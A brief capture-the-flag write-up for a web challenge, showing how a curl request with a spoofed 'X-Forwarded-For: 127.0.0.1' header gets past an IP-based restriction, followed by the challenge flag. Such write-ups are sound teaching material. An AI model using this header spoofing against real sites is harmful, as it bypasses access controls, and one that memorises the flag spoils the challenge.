#### FirstOfWAF
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e7c8851-8a64-4297-b691-bfa765cfc7d5)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fd50198f-d971-478c-8d61-5ce8e66b0b40)

The text `FORWARDED` was bolden this gives the hint to use the `X-Forwarded-For` header

I used `curl` and added the header to my request then got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c3b22f9b-aec5-4ba6-8d8c-44a462da83a2)

```
curl -H "X-Forwarded-For: 127.0.0.1" https://csean-waf.chals.io/
```

```
Flag: csean-ctf{NO_PLACE_L!k3_0x7f000001}
```
